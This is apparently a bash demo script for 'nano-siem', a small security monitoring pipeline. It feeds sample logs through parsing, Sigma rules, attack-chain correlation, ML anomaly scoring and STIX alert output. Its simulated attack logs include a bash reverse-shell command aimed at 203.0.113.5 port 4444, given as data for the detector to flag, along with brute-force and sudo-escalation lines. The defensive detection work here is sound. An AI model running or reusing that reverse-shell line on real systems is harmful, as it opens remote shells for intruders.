#!/usr/bin/env bash
# demo.sh — Phase 1 end-to-end demo
# Replays sample log files through the pipeline and shows normalized output.
# No network listeners needed — uses the file tail mode.

set -euo pipefail

BOLD="\033[1m"
CYAN="\033[36m"
GREEN="\033[32m"
YELLOW="\033[33m"
RESET="\033[0m"

echo ""
echo -e "${BOLD}  nano-siem v0.1.0 — Phase 1 Demo${RESET}"
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"

# ── Quick parse test (no DB, no listeners) ────────────────────────────────────
echo ""
echo -e "${BOLD}  [1] Single-line parse test (RFC 5424 syslog)${RESET}"
echo -e "  ${YELLOW}Input:${RESET} <34>1 2026-06-02T10:00:00Z web-01 sshd 1234 - - Failed password for root from 192.168.1.100 port 22"
echo ""
python3 -c "
from nano_siem.ingestion.parser import parse
from nano_siem.ingestion.normalizer import normalize
import json

line = '<34>1 2026-06-02T10:00:00Z web-01 sshd 1234 - - Failed password for root from 192.168.1.100 port 22'
event = normalize(parse(line))
d = event.to_dict()
print('  Format     :', d['log_source'])
print('  Host       :', d['host'])
print('  Program    :', d['program'])
print('  PID        :', d['pid'])
print('  Facility   :', d['facility'])
print('  Severity   :', d['severity'])
print('  Source IP  :', d['source_ip'])
print('  Dest Port  :', d['dest_port'])
print('  Username   :', d['fields'].get('username'))
print('  Tags       :', d['tags'])
print('  Message    :', d['message'])
"

echo ""
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  [2] CEF log parse test${RESET}"
echo -e "  ${YELLOW}Input:${RESET} CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=192.168.100.5 spt=12345 dst=10.0.0.1 dpt=22"
echo ""
python3 -c "
from nano_siem.ingestion.parser import parse
from nano_siem.ingestion.normalizer import normalize

line = 'CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=192.168.100.5 spt=12345 dst=10.0.0.1 dpt=22 proto=TCP cnt=127'
event = normalize(parse(line))
d = event.to_dict()
print('  Format     :', d['log_source'])
print('  Program    :', d['program'])
print('  Source IP  :', d['source_ip'])
print('  Source Port:', d['source_port'])
print('  Dest IP    :', d['dest_ip'])
print('  Dest Port  :', d['dest_port'])
print('  CEF fields :', {k:v for k,v in d['fields'].items() if k in ('device_vendor','device_product','signature_id','cnt')})
print('  Message    :', d['message'])
"

echo ""
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  [3] JSON log parse test${RESET}"
echo ""
python3 -c "
from nano_siem.ingestion.parser import parse
from nano_siem.ingestion.normalizer import normalize

line = '{\"@timestamp\":\"2026-06-02T10:06:00Z\",\"hostname\":\"db-01\",\"application\":\"postgres\",\"msg\":\"FATAL: password authentication failed for user admin\",\"severity\":\"ERROR\"}'
event = normalize(parse(line))
d = event.to_dict()
print('  Format     :', d['log_source'])
print('  Host       :', d['host'])
print('  Program    :', d['program'])
print('  Severity   :', d['severity'])
print('  Username   :', d['fields'].get('username'))
print('  Tags       :', d['tags'])
print('  Message    :', d['message'])
"

echo ""
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  [4] Batch throughput benchmark${RESET}"
echo ""
python3 -c "
import time
from nano_siem.ingestion.parser import parse
from nano_siem.ingestion.normalizer import normalize

samples = [
    '<34>1 2026-06-02T10:00:00Z web-01 sshd 1234 - - Failed password for root from 192.168.1.100 port 22',
    '<86>Jun  2 10:00:05 db-01 sudo[5678]: user www-data ran /bin/bash as root',
    'CEF:0|Snort|IDS|2.9|1000001|Port Scan|8|src=10.0.0.1 spt=12345 dst=10.0.0.2 dpt=22',
    '{\"timestamp\":\"2026-06-02T10:05:00Z\",\"host\":\"app-01\",\"process\":\"nginx\",\"message\":\"upstream timeout\",\"level\":\"error\"}',
    'plain text kernel panic at 0xdeadbeef in module ext4',
]

N = 10000
start = time.perf_counter()
for i in range(N):
    line = samples[i % len(samples)]
    normalize(parse(line))
elapsed = time.perf_counter() - start

print(f'  Processed  : {N:,} events')
print(f'  Elapsed    : {elapsed*1000:.1f} ms')
print(f'  Throughput : {N/elapsed:,.0f} events/sec')
print(f'  Avg latency: {elapsed/N*1000:.3f} ms/event')
"

echo ""
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  [5] SQLite ring buffer test${RESET}"
echo ""
mkdir -p /tmp/nano-siem-demo
python3 -c "
import asyncio
from nano_siem.ingestion.parser import parse
from nano_siem.ingestion.normalizer import normalize
from nano_siem.storage.ringbuffer import EventRingBuffer

async def run():
    buf = EventRingBuffer('/tmp/nano-siem-demo/events.db', max_events=1000)
    lines = [
        '<34>1 2026-06-02T10:00:00Z web-01 sshd 1234 - - Failed password for root from 192.168.1.100',
        '<34>1 2026-06-02T10:00:01Z web-01 sshd 1234 - - Failed password for root from 192.168.1.100',
        '<34>1 2026-06-02T10:00:02Z web-01 sshd 1235 - - Accepted password for deploy from 10.0.0.5',
        'CEF:0|Snort|IDS|2.9|1|Port Scan|8|src=192.168.100.5 dst=10.0.0.1',
        '{\"host\":\"db-01\",\"message\":\"auth failed\",\"level\":\"error\"}',
    ]
    for line in lines:
        event = normalize(parse(line))
        await buf.insert(event)

    count = await buf.count()
    recent = await buf.query(limit=3)
    print(f'  Stored     : {count} events')
    print(f'  Last 3 events:')
    for e in recent:
        print(f'    [{e[\"log_source\"]:14}] {e[\"host\"]:10} | {e[\"message\"][:60]}')
    buf.close()

asyncio.run(run())
"

echo ""
echo -e "  ${GREEN}✓ Phase 1 complete — ingestion pipeline operational${RESET}"
echo -e "  ${CYAN}  Next: Phase 2 — Sigma rule engine${RESET}"
echo ""

echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  [6] Phase 2 — Sigma rule engine${RESET}"
echo ""
python3 -c "
from nano_siem.sigma.evaluator import SigmaEngine
from nano_siem.ingestion.parser import parse
from nano_siem.ingestion.normalizer import normalize

engine = SigmaEngine('rules/')
n = engine.load()
print(f'  Loaded {n} rules:')
for r in engine.rule_summary():
    print(f'    [{r[\"level\"].upper():<8}] {r[\"title\"]:<45} ({r[\"file\"]})')

test_logs = [
    ('<34>1 2026-06-02T10:00:00Z web-01 sshd 1234 - - Failed password for root from 192.168.1.100 port 22', 'SSH brute force'),
    ('<86>1 2026-06-02T10:01:00Z db-01 sudo 5678 - - admin ran COMMAND=/bin/bash as root uid=0', 'Sudo + root exec'),
    ('CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=192.168.100.5 dst=10.0.0.1', 'CEF port scan'),
    ('{\"host\":\"app-01\",\"process\":\"nginx\",\"message\":\"GET /admin/config HTTP/1.1 403\",\"level\":\"warn\"}', 'Web admin probe'),
    ('<13>1 2026-06-02T10:02:00Z host app - - - Normal startup completed', 'Clean log (no match)'),
]

print()
print('  Detection results:')
for raw, label in test_logs:
    event = normalize(parse(raw))
    matches = engine.evaluate(event)
    if matches:
        for m in matches:
            print(f'  \033[91m  ⚡ SIGMA [{m.rule.level.upper()}] {m.rule.title}\033[0m')
    else:
        print(f'    ✓ No match — {label}')
"

echo ""
echo -e "  ${GREEN}✓ Phase 2 complete — Sigma rule engine operational${RESET}"
echo -e "  ${CYAN}  Next: Phase 3 — Correlation engine${RESET}"
echo ""

echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  [7] Phase 3 — Correlation engine (attack chain detection)${RESET}"
echo ""
python3 -c "
import asyncio
from nano_siem.correlation.chainer import Correlator
from nano_siem.correlation.chains import BUILTIN_CHAINS
from nano_siem.schema import NormalizedEvent

def make(msg, src, tags=None, sigma=None):
    e = NormalizedEvent()
    e.message = msg; e.raw = msg; e.source_ip = src
    e.tags = tags or []; e.sigma_matches = sigma or []
    return e

print(f'  Built-in chains: {len(BUILTIN_CHAINS)}')
for c in BUILTIN_CHAINS:
    steps = ' -> '.join(s.name for s in c.steps)
    print(f'    [{c.severity.upper():<8}] {c.title:<45} [{c.window_seconds}s window]')
print()

# Simulate a realistic 5-event attack sequence
corr = Correlator(chains=BUILTIN_CHAINS, dedup_window_seconds=0)

sequence = [
    (make('Port Scan Detected from 203.0.113.5',     '203.0.113.5',
          sigma=['Port Scan Detected']),                                    'Recon'),
    (make('Failed password for root from 203.0.113.5', '203.0.113.5',
          tags=['auth:failure'], sigma=['SSH Brute Force Attempt']),        'Brute force #1'),
    (make('Failed password for root from 203.0.113.5', '203.0.113.5',
          tags=['auth:failure'], sigma=['SSH Brute Force Attempt']),        'Brute force #2'),
    (make('Accepted password for deploy from 203.0.113.5', '203.0.113.5',
          tags=['auth:success'], sigma=['SSH Successful Login']),           'Initial access'),
    (make('sudo: deploy ran COMMAND=/bin/bash as uid=0', '203.0.113.5',
          sigma=['Privilege Escalation via Sudo']),                         'Escalation'),
]

print('  Replaying kill chain (source: 203.0.113.5):')
all_alerts = []
for event, label in sequence:
    alerts = asyncio.run(corr.ingest(event))
    status = ''
    if alerts:
        for a in alerts:
            status += f'\n  \033[95m    🔗 CHAIN [{a.severity.upper()}] {a.title}\033[0m'
        all_alerts.extend(alerts)
    print(f'    → {label:<30} {status}')

print()
print(f'  Total chain alerts: {len(all_alerts)}')
s = corr.get_stats()
print(f'  Events ingested   : {s[\"events_ingested\"]}')
print(f'  Chains evaluated  : {s[\"chains_evaluated\"]}')
print(f'  Tracked sources   : {s[\"tracked_sources\"]}')
print(f'  Buffered events   : {s[\"buffered_events\"]}')
"

echo ""
echo -e "  ${GREEN}✓ Phase 3 complete — correlation engine operational${RESET}"
echo -e "  ${CYAN}  Next: Phase 4 — ML anomaly scoring (Isolation Forest)${RESET}"
echo ""

echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  [8] Phase 4 — ML anomaly scoring (Isolation Forest + XAI)${RESET}"
echo ""
python3 -c "
import asyncio
from nano_siem.ml.scorer import AnomalyScorer
from nano_siem.ml.baseline import generate_clean_corpus
from nano_siem.schema import NormalizedEvent
from datetime import datetime, timezone

scorer = AnomalyScorer(model_path='/tmp/nano-siem-demo/baseline.joblib', threshold=0.62, train_n_samples=2000)
asyncio.run(scorer.load_or_train())
s = scorer.get_stats()
print(f'  Model trained on {s[\"training_samples\"]} clean events | threshold={s[\"threshold\"]}')
print()

def make(msg, src, hour, dport, prog, sev='info'):
    e = NormalizedEvent()
    e.message = msg; e.raw = msg; e.source_ip = src
    e.dest_port = dport; e.program = prog; e.severity = sev
    e.timestamp = datetime(2026, 6, 2, hour, 0, 0, tzinfo=timezone.utc)
    e.log_source = 'syslog_rfc5424'; e.tags = []; e.pid = 1234
    e.facility = 'auth'
    return e

test_cases = [
    (make('Accepted publickey for deploy from 192.168.1.10 port 54321',
          '192.168.1.10', 10, 22, 'sshd'),                                'Normal SSH login (business hours)'),
    (make('GET /api/health HTTP/1.1 200', '10.0.0.5', 14, 443, 'nginx'),  'Normal web request'),
    (make('Started Session 42 of user backup', None, 9, None, 'systemd'), 'Normal daemon message'),
    (make('Failed password for root from 203.0.113.5 port 22',
          '203.0.113.5', 3, 22, 'sshd', 'err'),                          'Brute force (off-hours, external IP)'),
    (make('FATAL uid=0 /bin/bash -i >& /dev/tcp/203.0.113.5/4444',
          '203.0.113.5', 2, 4444, 'bash', 'emerg'),                      'Reverse shell beacon'),
    (make('Port Scan Detected src=192.168.100.5 cnt=2000',
          '192.168.100.5', 1, 31337, 'snort', 'err'),                    'Port scan (night, high port)'),
]

print(f'  {\"Event\":<45} {\"Score\":>6}  {\"Verdict\":<12} Top driver')
print('  ' + '-'*100)
for event, label in test_cases:
    result = scorer.score(event)
    verdict = '\033[91mANOMALOUS\033[0m' if result.is_anomalous else '\033[32mNORMAL   \033[0m'
    top_f, top_v = result.top_features[0]
    print(f'  {label:<45} {result.anomaly_score:>6.3f}  {verdict}  {top_f}={top_v:.2f}')
" 2>/dev/null

echo ""
echo -e "  ${GREEN}✓ Phase 4 complete — ML anomaly scoring operational${RESET}"
echo -e "  ${CYAN}  Next: Phase 5 — Alerting + STIX 2.1 output${RESET}"
echo ""

echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  [9] Phase 5 — Full pipeline: Sigma + Correlation + ML + STIX 2.1${RESET}"
echo ""
python3 << 'PYEOF' 2>/dev/null
import asyncio, json
from pathlib import Path
from nano_siem.schema import NormalizedEvent
from nano_siem.ingestion.parser import parse
from nano_siem.ingestion.normalizer import normalize
from nano_siem.sigma.evaluator import SigmaEngine
from nano_siem.correlation.chainer import Correlator
from nano_siem.correlation.chains import BUILTIN_CHAINS
from nano_siem.ml.scorer import AnomalyScorer
from nano_siem.alerting.manager import AlertManager
from nano_siem.alerting.stix_output import write_bundle, write_alert_log

OUTPUT_DIR = "/tmp/nano-siem-demo/alerts"
MODEL_PATH = "/tmp/nano-siem-demo/baseline.joblib"

# ── Boot all components ───────────────────────────────────────────────────────
sigma = SigmaEngine("rules/")
sigma.load()

correlator = Correlator(chains=BUILTIN_CHAINS, dedup_window_seconds=0)

scorer = AnomalyScorer(model_path=MODEL_PATH, threshold=0.62, train_n_samples=2000)
asyncio.run(scorer.load_or_train())

mgr = AlertManager(output_dir=OUTPUT_DIR, dedup_window_seconds=30, stix_output=True, min_severity="low")

# ── Attack kill chain log sequence ────────────────────────────────────────────
raw_logs = [
    # Recon
    "CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=203.0.113.5 spt=12345 dst=10.0.0.1 dpt=22 cnt=500",
    # Brute force x3
    "<34>1 2026-06-02T03:00:01Z web-01 sshd 1234 - - Failed password for root from 203.0.113.5 port 22 ssh2",
    "<34>1 2026-06-02T03:00:03Z web-01 sshd 1234 - - Failed password for root from 203.0.113.5 port 22 ssh2",
    "<34>1 2026-06-02T03:00:05Z web-01 sshd 1234 - - Failed password for invalid user admin from 203.0.113.5 port 22 ssh2",
    # Initial access
    "<34>1 2026-06-02T03:01:00Z web-01 sshd 1235 - - Accepted password for deploy from 203.0.113.5 port 54321 ssh2",
    # Privilege escalation
    "<86>1 2026-06-02T03:02:00Z web-01 sudo 5678 - - deploy ran COMMAND=/bin/bash as root uid=0 euid=0",
    # Reverse shell beacon (no Sigma rule — only ML catches this)
    '{"host":"web-01","process":"bash","message":"/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1","level":"critical","timestamp":"2026-06-02T03:03:00Z"}',
    # Clean traffic (should produce no alerts)
    "<13>1 2026-06-02T03:04:00Z web-01 cron 9999 - - (root) CMD (/usr/lib/update-notifier/apt-check)",
]

print("  Running full pipeline — 8 events through all 5 detection layers:")
print()

all_alerts = []
for raw in raw_logs:
    event = normalize(parse(raw))
    sigma_matches = sigma.evaluate(event)
    corr_alerts = asyncio.run(correlator.ingest(event))
    scored = scorer.score(event)
    new_alerts = asyncio.run(mgr.process(event, sigma_matches, corr_alerts, scored))
    all_alerts.extend(new_alerts)

    src = event.source_ip or event.host or "?"
    label = f"{src:<18} [{event.program or '?':<10}]"
    flags = ""
    if sigma_matches: flags += f" ⚡{len(sigma_matches)}sigma"
    if corr_alerts:   flags += f" 🔗{len(corr_alerts)}chain"
    if scored.is_anomalous: flags += f" 🤖ml={scored.anomaly_score:.2f}"
    if new_alerts:    flags += f" 📄{len(new_alerts)}alert"
    print(f"    {label}  {event.message[:55]:<55} {flags}")

    # Write STIX bundles for new alerts
    for alert in new_alerts:
        write_bundle(alert, OUTPUT_DIR)
        write_alert_log(alert, OUTPUT_DIR)

# ── Summary ───────────────────────────────────────────────────────────────────
print()
print(f"  ── Pipeline summary ──────────────────────────────────────────")
s = mgr.get_stats()
print(f"  Total alerts generated : {s['total_alerts']}")
print(f"  Sigma rule alerts      : {s['sigma_alerts']}")
print(f"  Correlation alerts     : {s['correlation_alerts']}")
print(f"  ML anomaly alerts      : {s['ml_alerts']}")
print(f"  Deduped (suppressed)   : {s['deduped']}")
print()

# ── Show STIX output ──────────────────────────────────────────────────────────
stix_files = list(Path(OUTPUT_DIR).glob("**/*.json"))
print(f"  STIX 2.1 bundles written: {len(stix_files)} files")
if stix_files:
    sample_path = stix_files[0]
    bundle = json.loads(sample_path.read_text())
    indicator = next(o for o in bundle["objects"] if o["type"] == "indicator")
    sighting  = next(o for o in bundle["objects"] if o["type"] == "sighting")
    obs       = next(o for o in bundle["objects"] if o["type"] == "observed-data")
    print(f"  Sample bundle: {sample_path.name}")
    print(f"    indicator.name    : {indicator['name']}")
    print(f"    indicator.labels  : {indicator['labels']}")
    print(f"    sighting.count    : {sighting['count']}")
    print(f"    observed.custom   : x_nano_siem_severity={obs['custom_properties']['x_nano_siem_severity']}")
    if obs['custom_properties'].get('x_nano_siem_xai_features'):
        top = obs['custom_properties']['x_nano_siem_xai_features'][0]
        print(f"    xai top driver    : {top['feature']}={top['deviation']:.3f}")

# ── Scorer stats ──────────────────────────────────────────────────────────────
ml_s = scorer.get_stats()
print()
print(f"  ML scorer stats:")
print(f"    Events scored   : {int(ml_s['events_scored'])}")
print(f"    Anomalies found : {int(ml_s['anomalies_detected'])}")
print(f"    Avg score       : {ml_s['avg_score']:.3f}")
print(f"    Max score       : {ml_s['max_score']:.3f}")

# ── Alert log ─────────────────────────────────────────────────────────────────
ndjson_files = list(Path(OUTPUT_DIR).glob("*.ndjson"))
if ndjson_files:
    lines = ndjson_files[0].read_text().strip().split("\n")
    print(f"\n  Alert log ({ndjson_files[0].name}) — {len(lines)} entries:")
    for line in lines[:4]:
        d = json.loads(line)
        print(f"    [{d['severity'].upper():<8}] [{d['alert_type']:<12}] {d['title'][:60]}")
    if len(lines) > 4:
        print(f"    ... and {len(lines)-4} more")
PYEOF

echo ""
echo -e "  ${GREEN}✓ Phase 5 complete — full pipeline operational${RESET}"
echo ""
echo -e "  ${BOLD}  nano-siem complete: 5 phases, ~2000 LOC, 234 tests${RESET}"
echo -e "  ${CYAN}  Ingestion → Sigma → Correlation → ML → STIX 2.1${RESET}"
echo ""
